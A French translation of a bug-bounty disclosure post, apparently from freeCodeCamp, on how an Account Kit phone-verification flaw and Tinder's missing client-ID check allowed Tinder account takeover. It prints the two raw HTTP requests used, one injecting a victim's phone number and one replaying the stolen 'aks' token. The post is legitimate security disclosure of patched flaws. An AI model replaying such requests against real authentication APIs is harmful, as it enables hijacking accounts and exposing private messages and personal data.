---
title: Comment j'ai piraté des comptes Tinder en utilisant le Kit de compte de Facebook
  et gagné 6 250 $ en primes
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2018-02-20T16:02:10.000Z'
originalURL: https://freecodecamp.org/news/hacking-tinder-accounts-using-facebook-accountkit-d5cc813340d1
coverImage: https://cdn-media-1.freecodecamp.org/images/1*vHP5HMwV-gHOYTtgVxYzfw.jpeg
tags:
- name: General Programming
  slug: programming
- name: Security
  slug: security
- name: startup
  slug: startup
- name: 'tech '
  slug: tech
- name: Web Development
  slug: web-development
seo_title: Comment j'ai piraté des comptes Tinder en utilisant le Kit de compte de
  Facebook et gagné 6 250 $ en primes
seo_desc: 'By AppSecure

  This is being published with the permission of Facebook under the responsible disclosure
  policy.

  The vulnerabilities mentioned in this blog post were plugged quickly by the engineering
  teams of Facebook and Tinder.

  This post is about an ...'
---

Par AppSecure

Ceci est publié avec la permission de Facebook dans le cadre de la politique de divulgation responsable.

Les vulnérabilités mentionnées dans cet article de blog ont été rapidement corrigées par les équipes d'ingénierie de Facebook et Tinder.

Cet article parle d'une vulnérabilité de prise de contrôle de compte que j'ai découverte dans l'application Tinder. En exploitant cela, un attaquant aurait pu accéder au compte Tinder de la victime, qui devait avoir utilisé son numéro de téléphone pour se connecter.

Cela aurait pu être exploité par le biais d'une vulnérabilité dans le Kit de compte de Facebook, **que Facebook a récemment résolue.**

Les applications web et mobiles de Tinder permettent aux utilisateurs d'utiliser leur numéro de téléphone mobile pour se connecter au service. Et ce service de connexion est fourni par Account Kit (Facebook).

![Image](https://cdn-media-1.freecodecamp.org/images/0*Pl2ybNU6xXSeKDeo.)
_Service de connexion alimenté par le Kit de compte de Facebook sur Tinder_

L'utilisateur clique sur **Se connecter avec le numéro de téléphone** sur [tinder.com](http://tinder.com/) et est ensuite redirigé vers Accountkit.com pour la connexion. Si l'authentification est réussie, Account Kit transmet le jeton d'accès à Tinder pour la connexion.

Fait intéressant, l'API de Tinder ne vérifiait pas l'**ID client** sur le jeton fourni par Account Kit.

Cela permettait à l'attaquant d'utiliser le jeton d'accès de n'importe quelle autre application fourni par Account Kit pour prendre le contrôle des vrais comptes Tinder d'autres utilisateurs.

### **Description de la vulnérabilité**

[Account Kit](http://accountkit.com) est un produit de Facebook qui permet aux gens de s'inscrire rapidement et de se connecter à certaines applications enregistrées en utilisant simplement leur numéro de téléphone ou leur adresse e-mail sans avoir besoin d'un mot de passe. Il est fiable, facile à utiliser et donne à l'utilisateur le choix de la manière dont il souhaite s'inscrire aux applications.

[Tinder](http://tinder.com) est une application mobile basée sur la localisation pour rechercher et rencontrer de nouvelles personnes. Elle permet aux utilisateurs d'aimer ou de ne pas aimer d'autres utilisateurs, puis de passer à un chat si les deux parties ont glissé vers la droite.

Il y avait une vulnérabilité dans Account Kit par laquelle un attaquant aurait pu accéder au compte Account Kit de n'importe quel utilisateur simplement en utilisant son numéro de téléphone. Une fois à l'intérieur, l'attaquant aurait pu obtenir le jeton d'accès Account Kit de l'utilisateur présent dans ses cookies (aks).

Après cela, l'attaquant pouvait utiliser le jeton d'accès (aks) pour se connecter au compte Tinder de l'utilisateur en utilisant une API vulnérable.

### **Comment mon exploit a fonctionné étape par étape**

#### Étape #1

Tout d'abord, l'attaquant se connecterait au compte Account Kit de la victime en entrant le numéro de téléphone de la victime dans "**new_phone_number**" dans la demande d'API montrée ci-dessous.

Veuillez noter que Account Kit ne vérifiait pas la correspondance des numéros de téléphone avec leur mot de passe à usage unique. L'attaquant pouvait entrer le numéro de téléphone de n'importe qui et ensuite simplement se connecter au compte Account Kit de la victime.

Ensuite, l'attaquant pouvait copier le jeton d'accès "aks" de l'application Account Kit de la victime à partir des cookies.

**L'API vulnérable d'Account Kit :**

> _POST /update/async/phone/confirm/?dpr=2 HTTP/1.1_

> _Host: [www.accountkit.com](http://www.accountkit.com)_

> _new_phone_number=[numéro de téléphone de la victime]&update_request_code=c1fb2e919bb33a076a7c6fe4a9fbfa97[code de demande de l'attaquant]&confirmation_code=258822[code de l'attaquant]&__user=0&__a=1&__dyn=&__req=6&__be=-1&__pc=PHASED%3ADEFAULT&__rev=3496767&fb_dtsg=&jazoest=_

![Image](https://cdn-media-1.freecodecamp.org/images/0*f8qh3mB0PK71sZP_.)
_Image montrant le cookie "aks" sur accountkit.com_

### Étape #2

Maintenant, l'attaquant rejoue simplement la demande suivante en utilisant le jeton d'accès copié "aks" de la victime dans l'API Tinder ci-dessous.

Ils seront connectés au compte Tinder de la victime. L'attaquant aurait alors essentiellement un contrôle total sur le compte de la victime. Ils pourraient lire les chats privés, les informations personnelles complètes, et faire glisser les profils d'autres utilisateurs vers la gauche ou la droite, entre autres.

**API Tinder vulnérable :**

> _POST /v2/auth/login/accountkit?locale=en HTTP/1.1_  
> _Host: **api.gotinder.com**_  
> _Connection: close_  
> _Content-Length: 185_  
> _Origin: [https://tinder.com](https://tinder.com)_  
> _app-version: 1000000_  
> _platform: web_  
> _User-Agent: Mozilla/5.0 (Macintosh)_  
> _content-type: application/json_  
> _Accept: */*_  
> _Referer: [https://tinder.com/](https://tinder.com/)_  
> _Accept-Encoding: gzip, deflate_  
> _Accept-Language: en-US,en;q=0.9_  
> _{"token":"xxx","id":""}_

### **Preuve de concept vidéo**

### **Chronologie**

Les deux vulnérabilités ont été rapidement corrigées par Tinder et Facebook. Facebook m'a récompensé avec 5 000 USD, et Tinder m'a attribué 1 250 USD.

Je suis le fondateur de [AppSecure](https://appsecure.in), une entreprise spécialisée en cybersécurité avec des années de compétences acquises et une expertise méticuleuse. Nous sommes là pour protéger votre entreprise et vos données critiques contre les menaces ou vulnérabilités en ligne et hors ligne.

Vous pouvez nous contacter à [anand.prakash@appsecure.in](mailto:anand.prakash@appsecure.in) ou [sales@appsecure.in](mailto:sales@appsecure.in).